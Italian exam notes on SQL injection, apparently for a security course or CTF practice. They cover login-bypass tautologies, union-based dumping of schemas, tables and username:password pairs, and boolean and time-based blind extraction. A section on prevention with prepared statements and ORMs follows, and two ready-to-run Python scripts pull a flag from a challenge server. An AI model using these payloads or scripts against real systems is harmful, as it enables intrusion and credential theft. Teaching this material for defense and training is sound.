# Appunti d'Esame: SQL Injection (SQLi)

Questo modulo raccoglie ed elabora in modo discorsivo e tecnico le slide relative alle **SQL Injection**, suddivise nei due macro-argomenti d'esame: **Classic & Union-Based SQLi** e **Blind SQLi (Boolean & Time-Based)**. 

Gli appunti sono strutturati per fornire prima una comprensione intuitiva e concettuale dei vettori d'attacco, seguita dai dettagli tecnici operativi e dagli script Python pronti per l'automazione.

---

## Modulo 1: SQL Injection Classiche e Union-Based

### 1. Inquadramento Concettuale
Quasi ogni applicazione web moderna si appoggia a un database relazionale per salvare e recuperare dati. La vulnerabilità di SQL Injection (SQLi) nasce quando l'applicazione **costruisce dinamicamente le query SQL concatenando direttamente l'input fornito dall'utente** senza opportuna validazione o parametrizzazione.

Concettualmente, l'attacco è del tutto analogo alle iniezioni di codice di sistema: il confine tra ciò che è **"dato"** (l'input inserito dall'utente) e ciò che è **"istruzione"** (il codice SQL programmato dall'applicazione) viene completamente abbattuto. Poiché l'interprete SQL del database riceve un'unica stringa in cui l'input utente contiene caratteri di controllo sintattico (come l'apice singolo `'`), esso interpreta tali caratteri come parte integrante del codice SQL, eseguendo query con una logica alterata rispetto a quella originariamente prevista dal programmatore.

---

### 2. Le Sfaccettature Tecniche

#### A. Login Bypass
La forma più semplice e immediata di SQL Injection si riscontra nelle schermate di autenticazione. Di norma, l'applicazione interroga il database chiedendo se esiste un utente che possiede contemporaneamente l'email e la password inserite nel form. Se il database restituisce almeno una riga corrispondente, l'applicazione considera le credenziali valide e concede l'accesso.

Se inseriamo caratteri maligni che forzano una tautologia (una condizione logica sempre vera), andiamo a rompere questo controllo. Facciamo sì che la query restituisca un risultato positivo a prescindere dalla conoscenza della password reale. Per fare questo, utilizziamo anche i commenti di riga SQL per far ignorare al database tutto ciò che segue la nostra iniezione (ovvero il controllo sulla password).

##### Approfondimento Tecnico
Si consideri la query PHP dinamica vulnerabile:
```php
$userQuery = mysqli_query("SELECT * FROM users WHERE email = '" . $_POST['email'] . "' AND password = '" . $_POST['password'] . "'");
```

Se inseriamo come valore nel campo email la stringa `' or 1=1 -- `, la query generata diventerà:
```sql
SELECT * FROM users WHERE email = '' or 1=1 -- ' AND password = ''
```
* **La scomposizione logica:**
  1. `email = ''`: Questa condizione è solitamente falsa.
  2. `or 1=1`: Questa condizione è **sempre vera**. Poiché l'operatore è `OR`, l'intera clausola `WHERE` diventa vera per ogni riga della tabella.
  3. `-- `: Nei database come MySQL, il doppio trattino seguito da uno spazio (`-- `) indica l'inizio di un commento. Tutto ciò che si trova alla sua destra (incluso il controllo della password `AND password = '...'`) viene completamente ignorato dall'interprete SQL.
* **Effetto pratico:** Il database restituisce tutti i record della tabella `users`. L'applicazione prenderà il primo record restituito (solitamente l'amministratore) e ci autenticherà senza aver mai conosciuto la password.
* **Caratteri d'esplorazione (Fuzzing iniziale):** Per testare manualmente se un campo di input è vulnerabile a SQL Injection, si prova ad inserire caratteri di rottura sintattica SQL:
  * `'` (Apice singolo)
  * `"` (Doppio apice)
  * `\` (Backslash)
  * `` ` `` (Backtick)
  Se l'applicazione restituisce un errore di sintassi SQL (es. *500 Internal Server Error* o messaggi d'errore del database esposti), il parametro è quasi certamente vulnerabile.

---

#### B. Union-Based SQL Injections
Quando la nostra iniezione non avviene in un punto di controllo logico, ma all'interno di una query che seleziona dati che vengono poi **mostrati a schermo all'utente** (ad esempio, la pagina di visualizzazione di un articolo di un blog), possiamo fare molto più di un login bypass: possiamo esfiltrare l'intero database.

La tecnica fa perno sull'operatore SQL `UNION`. Immagina l'operatore `UNION` come un collante che permette di accodare i risultati di una seconda query (scritta interamente da noi) ai risultati della query originale dell'applicazione. Se la query originale mostrava a schermo un post del blog, la query iniettata tramite `UNION` mostrerà nello stesso identico spazio i dati riservati estratti da altre tabelle (come le password degli utenti).

##### Approfondimento Tecnico
La clausola `UNION` unisce i risultati di due o più istruzioni `SELECT` in un unico set di risultati. Tuttavia, l'interprete SQL impone due vincoli rigorosi affinché l'unione sia valida:
1. Le query devono selezionare lo **stesso identico numero di colonne**.
2. Le colonne nelle rispettive posizioni devono avere **tipi di dati compatibili** (es. se la seconda colonna della prima query è un numero intero, la seconda colonna della nostra query non deve generare un errore di conversione di tipo, sebbene in MySQL vi sia molta tolleranza rispetto a PostgreSQL).

##### 1. Determinare il Numero di Colonne (Black-Box)
Non conoscendo la query originale formulata dallo sviluppatore, dobbiamo scoprire quante colonne seleziona. Esistono due metodi:

* **Metodo 1: Brute-Force con UNION SELECT**
  Consiste nel tentare di unire query con un numero crescente di valori fittizi (numeri o `NULL`) finché il database smette di restituire errori di sintassi:
  ```sql
  1 UNION SELECT 1 --      -> Errore (colonne non corrispondenti)
  1 UNION SELECT 1,2 --    -> Errore
  1 UNION SELECT 1,2,3 --  -> Successo! Le colonne sono esattamente 3.
  ```

* **Metodo 2: Uso della keyword ORDER BY (Più efficiente)**
  La clausola `ORDER BY` ordina i risultati in base a una colonna. Al posto del nome della colonna, accetta anche l'indice numerico (1 per la prima colonna, 2 per la seconda, ecc.). Se inseriamo un indice superiore al numero di colonne effettive, il database genererà un errore. Possiamo usare una ricerca binaria o esponenziale per trovare il limite:
  ```sql
  1 ORDER BY 1 --   -> OK
  1 ORDER BY 2 --   -> OK
  1 ORDER BY 4 --   -> Errore! (Non esiste la quarta colonna)
  1 ORDER BY 3 --   -> OK. Le colonne totali sono 3.
  ```

##### 2. Annullare l'Output della Query Originale
Solitamente le pagine web d'esame mostrano solo il primo record restituito dal database (magari usando un limite interno come `LIMIT 1`). Se la query originale restituisce un record valido (es. l'articolo con `id = 1`), il nostro record iniettato tramite `UNION` finirà in seconda posizione e non verrà mostrato a schermo.
* **La Soluzione:** Dobbiamo forzare la query originale a **non restituire alcun risultato**, rendendo falsa la sua condizione logica. In questo modo, l'unico record che verrà posizionato come primo e mostrato a schermo sarà quello generato dal nostro `UNION SELECT`.
* **Payload pratico:**
  Al posto di `id = 1`, inseriamo `id = -1` (inesistente) oppure `id = 1 AND 1=0`:
  ```sql
  SELECT title, body FROM posts WHERE id = 1 AND 1=0 UNION SELECT 1, 'mio_payload' -- 
  ```

##### 3. Ricostruzione del Database tramite INFORMATION_SCHEMA
Sempre in un contesto di black-box, non sappiamo quali tabelle o colonne esistano nel database. Nei sistemi di gestione di database relazionali (DBMS) come MySQL, MariaDB, PostgreSQL e MS SQL, esiste un database speciale chiamato `INFORMATION_SCHEMA` che contiene tutti i metadati del server.
Le tabelle fondamentali da consultare in `INFORMATION_SCHEMA` sono:
* `schemata`: Contiene l'elenco di tutti i database presenti sul server.
* `tables`: Contiene l'elenco di tutte le tabelle.
* `columns`: Contiene l'elenco di tutte le colonne di tutte le tabelle.

* **Fase 1: Estrazione dei Database (Schemi)**
  ```sql
  -1 UNION SELECT 1, schema_name FROM information_schema.schemata -- 
  ```
  *(Nota: Se la pagina mostra solo un risultato alla volta, possiamo usare la funzione `group_concat(schema_name)` per concatenare tutti i nomi dei database in un'unica stringa separata da virgole).*
  ```sql
  -1 UNION SELECT 1, group_concat(schema_name) FROM information_schema.schemata -- 
  ```

* **Fase 2: Estrazione delle Tabelle del Database corrente**
  La funzione `DATABASE()` restituisce il nome del database attualmente in uso dall'applicazione:
  ```sql
  -1 UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema = DATABASE() -- 
  ```

* **Fase 3: Estrazione delle Colonne di una Tabella Specifica**
  Ipotizzando di aver trovato una tabella di forte interesse chiamata `users`:
  ```sql
  -1 UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = 'users' -- 
  ```

* **Fase 4: Esfoltrazione dei Dati Sensibili**
  Ora che conosciamo la tabella (`users`) e le colonne di interesse (es. `username` e `password`), possiamo lanciare la query finale per leggere i dati:
  ```sql
  -1 UNION SELECT 1, group_concat(username, ':', password) FROM users -- 
  ```

---

## Modulo 2: Blind SQL Injection (Boolean & Time-Based)

### 1. Inquadramento Concettuale
In molti scenari reali o esercizi d'esame avanzati, l'applicazione non mostra a schermo i dati estratti dal database, né restituisce messaggi di errore SQL dettagliati in caso di anomalie. L'applicazione si limita a comportarsi in modo binario, oppure non mostra alcuna variazione visiva.

Queste iniezioni vengono chiamate **Blind SQL Injections (Iniezioni Cieche)**. Sebbene l'attaccante non possa "leggere" direttamente i dati, può comunque **interrogare il database ponendo domande chiuse (Sì/No)** sotto forma di espressioni logiche. Se la risposta alla domanda è vera, l'applicazione mostrerà un comportamento specifico (es. un testo di conferma o un login riuscito); se è falsa, ne mostrerà un altro. Sfruttando questo canale logico di feedback, è possibile estrarre qualsiasi informazione dal database carattere per carattere.

---

### 2. Le Sfaccettature Tecniche

#### A. Boolean-Based Blind SQLi
Immagina di voler indovinare una password segreta memorizzata nel database ma di poter fare solo domande a cui l'applicazione risponderà con "Sì" o "No". Potresti chiedere: *"La password comincia con la lettera 'a'?"*. Se la pagina si carica normalmente (Sì), hai trovato la prima lettera. Se la pagina restituisce un errore generico o manca un pezzo di testo (No), provi con la 'b', e così via. Trovata la prima lettera, passi alla seconda: *"La seconda lettera è una 'a'?"*. 

Questo processo di indagine prende il nome di **Boolean-Based Blind SQLi**. Per automatizzarlo, dobbiamo costruire delle condizioni logiche iniettate che controllino la veridicità delle nostre ipotesi e osservare la risposta dell'oracolo applicativo.

##### Approfondimento Tecnico
Si consideri una query in cui l'input controlla la selezione di un articolo, ma la pagina mostra solo se l'articolo esiste o meno (senza stamparne il contenuto):
```sql
SELECT * FROM posts WHERE id = $input
```
Se iniettiamo una condizione booleana tramite l'operatore `AND`:
```sql
SELECT * FROM posts WHERE id = 1 AND (SELECT 1 WHERE [condizione_da_testare]) = 1
```
* Se la `[condizione_da_testare]` è **vera**, l'intera sotto-query restituisce `1`. Essendo `1 = 1`, la clausola `AND` è soddisfatta e l'articolo con `id = 1` viene mostrato normalmente.
* Se la `[condizione_da_testare]` è **falsa**, la sotto-query non restituisce nulla. Il confronto fallisce, la clausola `AND` diventa falsa e l'applicazione si comporterà come se l'articolo `id = 1` non esistesse.

##### Tecniche di Estrazione Carattere per Carattere in MySQL
Per esaminare la stringa segreta carattere per carattere, si utilizzano principalmente due funzioni:

1. **L'operatore LIKE con Wildcard (`%` e `_`)**
   L'operatore `LIKE` effettua pattern matching. In MySQL è case-insensitive per default.
   * `%` rappresenta zero o più caratteri qualsiasi.
   * `_` rappresenta esattamente un singolo carattere qualsiasi.
   * **Esempi di utilizzo:**
     * `password LIKE 'a%'` -> Restituisce vero se la password inizia per 'a'.
     * `password LIKE 'ab%'` -> Restituisce vero se la password inizia per 'ab'.
   
2. **La funzione SUBSTR() o SUBSTRING()**
   Estrae una porzione di stringa specificando la posizione di partenza (1-indexed) e la lunghezza dei caratteri da prelevare.
   * **Sintassi:** `SUBSTR(stringa, posizione, lunghezza)`
   * **Esempio di utilizzo:**
     * `SUBSTR(password, 1, 1) = 'a'` -> Verifica se il primo carattere della password è 'a'.
     * `SUBSTR(password, 2, 1) = 'b'` -> Verifica se il secondo carattere della password è 'b'.

---

#### B. Time-Based Blind SQLi
Ci sono casi estremi in cui l'applicazione non mostra alcuna differenza visiva o strutturale nella risposta, indipendentemente dal fatto che la query SQL sia vera o falsa. L'oracolo visivo è completamente silente. 

Tuttavia, esiste un canale laterale fisico che non può essere nascosto facilmente: il **tempo di esecuzione**. Possiamo chiedere al database di eseguire un'operazione pesante e lenta, come la funzione `sleep()`, solo se la nostra ipotesi è vera. Se la pagina web impiega 5 o più secondi per caricarsi, significa che la nostra ipotesi era corretta; se risponde istantaneamente, l'ipotesi era errata.

##### Approfondimento Tecnico
La funzione principale utilizzata per introdurre latenza è `sleep(N)` in MySQL (oppure `pg_sleep(N)` in PostgreSQL). Questa funzione mette in pausa l'esecuzione della query per `N` secondi e restituisce `0` quando termina.

* **La Query Condizionale:**
  In MySQL, possiamo sfruttare l'istruzione condizionale `IF(condizione, valore_se_vero, valore_se_falso)` per attivare lo sleep in modo mirato:
  ```sql
  SELECT * FROM posts WHERE id = 1 AND IF(SUBSTR((SELECT password FROM users LIMIT 1), 1, 1) = 'a', sleep(5), 0)
  ```
  * **Analisi del flusso:**
    1. L'interprete valuta la condizione: il primo carattere della password dell'amministratore è 'a'?
    2. Se **Sì (Vero)**: l'istruzione esegue `sleep(5)`. La query si blocca per 5 secondi prima di completarsi e la risposta del server web arriverà con un visibile ritardo.
    3. Se **No (Falso)**: l'istruzione restituisce immediatamente `0`. La query termina istantaneamente.

---

## Modulo 3: Prevenire le SQL Injection

### 1. Inquadramento Concettuale
Il principio fondamentale della sicurezza applicativa contro le SQL Injection è: **mai fidarsi dei dati provenienti dall'esterno** (User Input) e trattarli rigorosamente come entità separate dalle istruzioni logiche. La sicurezza non deve dipendere dal tentativo di "pulire" o "filtrare" l'input dell'utente ex-post, bensì dall'architettura con cui la query viene compilata ed eseguita dal database.

---

### 2. Le Sfaccettature Tecniche e Rimedi

#### A. Sanificazione ed Escaping (La via debole)
* **Come funziona:** Consiste nel modificare preventivamente la stringa di input inserendo un carattere di escape (solitamente il backslash `\`) prima di ogni carattere speciale SQL (come `'` o `"`), neutralizzandone la capacità di interrompere la sintassi. In PHP si usavano storicamente funzioni come `addslashes()` o `mysqli_real_escape_string()`.
* **Perché è sconsigliato (Incline ad errori):**
  1. **Omissioni:** È estremamente facile per uno sviluppatore dimenticare di applicare la sanificazione su anche solo uno dei tantissimi parametri di input di un'applicazione complessa.
  2. **Bypass Multibyte:** Se il database e la connessione utilizzano codifiche di caratteri multibyte (come GBK per il cinese), l'attaccante può inserire sequenze di byte specifiche (es. `%df'`) che consumano il carattere di escape generato dalla funzione di sanificazione, ripristinando l'apice singolo e permettendo l'iniezione.

#### B. Prepared Statements (La soluzione ottimale)
* **Come funziona:** Chiamati anche query parametrizzate, rappresentano lo standard di sicurezza industriale. Invece di inviare al database una stringa unica contenente codice e dati miscelati, il processo viene diviso in due fasi distinte:
  1. **Fase di Preparazione:** L'applicazione invia al database la query "scheletro" contenente dei segnaposto (es. `?` o `:parametro`). Il database compila la query, ne analizza la sintassi e definisce rigidamente il piano di esecuzione.
  2. **Fase di Binding ed Esecuzione:** L'applicazione invia separatamente i valori dei dati da associare ai segnaposto. Poiché il piano sintattico della query è già stato compilato nella Fase 1, il database tratterà questi valori esclusivamente come dati letterali, impedendo a qualsiasi apice o carattere di controllo contenuto al loro interno di alterare la struttura della query.
* **Codice PHP sicuro (PDO):**
  ```php
  $sth = $dbh->prepare('SELECT * FROM users WHERE username = :username AND password = :password');
  $sth->bindParam(':username', $username);
  $sth->bindParam(':password', $password);
  $sth->execute();
  ```

#### C. ORM - Object-Relational Mapping (La prevenzione implicita)
* **Come funziona:** Un ORM è una libreria software (es. Hibernate per Java, SQLAlchemy per Python, Eloquent per PHP) che consente allo sviluppatore di interagire con il database modellando le tabelle come classi e i record come oggetti programmativi.
* **Perché protegge:** Gli sviluppatori non scrivono query SQL esplicite. È l'ORM stesso che si occupa di generare le query SQL in background e, per farlo, utilizza internamente e in modo sistematico i Prepared Statements, azzerando il rischio di SQL Injection accidentali.

---

## Toolkit d'Esame: Script Python d'Automazione (USB)

In questa sezione trovi i due script Python pronti per essere eseguiti d'esame. Sono completamente parametrizzati: per utilizzarli, ti basterà configurare le variabili all'inizio dello script.

### Script 1: Boolean-Based Blind SQLi Extractor
Questo script automatizza l'estrazione di una stringa (come una password o una flag) sfruttando un oracolo True/False. Misura la presenza di una specifica parola chiave nella risposta HTTP per capire se la domanda posta al database ha restituito Vero o Falso.

```python
import requests
import string

# ================= CONFIGURAZIONE PARAMETRI D'ESAME =================
TARGET_URL = "http://web-17.challs.olicyber.it/blind"  # Modificare con l'URL del challenge
TRUE_INDICATOR = "Welcome back"                       # Stringa presente nella pagina SOLO se la query è VERA
METHOD = "GET"                                        # "GET" o "POST"
PARAM_NAME = "id"                                     # Nome del parametro vulnerabile

# L'alfabeto dei caratteri da testare (es. flag, hash, esadecimali)
CHARSET = string.ascii_letters + string.digits + "{}_-!?"
# ====================================================================

def make_request(payload):
    """Esegue la richiesta HTTP inserendo il payload nel parametro vulnerabile."""
    if METHOD.upper() == "GET":
        response = requests.get(TARGET_URL, params={PARAM_NAME: payload})
    else:
        response = requests.post(TARGET_URL, data={PARAM_NAME: payload})
    return response.text

def extract_flag():
    extracted = ""
    print("[*] Avvio estrazione Boolean-Based Blind SQLi...")
    
    # Ciclo sulla posizione dei caratteri (fino a lunghezza stimata o flag chiusa)
    for position in range(1, 100):
        found_char = False
        for char in CHARSET:
            # Payload concettuale basato su SUBSTR
            # Esempio: id = 1 AND SUBSTR((SELECT flag FROM secrets LIMIT 1), {pos}, 1) = '{char}'
            # Adattare la query interna (SELECT ...) in base alle tabelle trovate
            payload = f"1 AND SUBSTR((SELECT flag FROM secrets LIMIT 1), {position}, 1) = '{char}'"
            
            html_output = make_request(payload)
            
            # Verifichiamo se l'oracolo ha risposto VERO
            if TRUE_INDICATOR in html_output:
                extracted += char
                print(f"[+] Trovato carattere alla pos {position}: '{char}' -> Password parziale: {extracted}")
                found_char = True
                break
        
        # Se non troviamo più corrispondenze o troviamo la parentesi graffa di chiusura della flag
        if not found_char or extracted.endswith("}"):
            break
            
    print(f"\n[!] Estrazione completata con successo! Stringa estratta: {extracted}")

if __name__ == "__main__":
    extract_flag()
```

---

### Script 2: Time-Based Blind SQLi Extractor
Questo script estrae i dati misurando la latenza della risposta HTTP. Se il server impiega un tempo superiore a una soglia definita (es. 3 secondi), la query è considerata Vera.

```python
import requests
import string
import time

# ================= CONFIGURAZIONE PARAMETRI D'ESAME =================
TARGET_URL = "http://web-17.challs.olicyber.it/time"   # Modificare con l'URL del challenge
TIME_DELAY = 4                                         # Secondi di sleep da far eseguire al DB
THRESHOLD = 3.0                                        # Soglia in secondi per considerare la risposta VERA
METHOD = "GET"
PARAM_NAME = "id"

CHARSET = string.ascii_letters + string.digits + "{}_-!?"
# ====================================================================

def make_request_time(payload):
    """Esegue la richiesta HTTP e misura il tempo impiegato per la risposta."""
    start_time = time.time()
    if METHOD.upper() == "GET":
        _ = requests.get(TARGET_URL, params={PARAM_NAME: payload})
    else:
        _ = requests.post(TARGET_URL, data={PARAM_NAME: payload})
    elapsed_time = time.time() - start_time
    return elapsed_time

def extract_flag_time():
    extracted = ""
    print("[*] Avvio estrazione Time-Based Blind SQLi...")
    
    for position in range(1, 100):
        found_char = False
        for char in CHARSET:
            # Costruzione payload condizionale con IF e SLEEP
            # Adattare la query interna (SELECT ...) a seconda della tabella bersaglio
            payload = f"1 AND IF(SUBSTR((SELECT flag FROM secrets LIMIT 1), {position}, 1) = '{char}', sleep({TIME_DELAY}), 0)"
            
            elapsed = make_request_time(payload)
            
            # Se il tempo impiegato supera la soglia di tolleranza, la query è VERA
            if elapsed >= THRESHOLD:
                extracted += char
                print(f"[+] Posizione {position}: '{char}' (Tempo: {elapsed:.2f}s) -> Parziale: {extracted}")
                found_char = True
                break
        
        if not found_char or extracted.endswith("}"):
            break
            
    print(f"\n[!] Estrazione completata con successo! Stringa estratta: {extracted}")

if __name__ == "__main__":
    extract_flag_time()
```
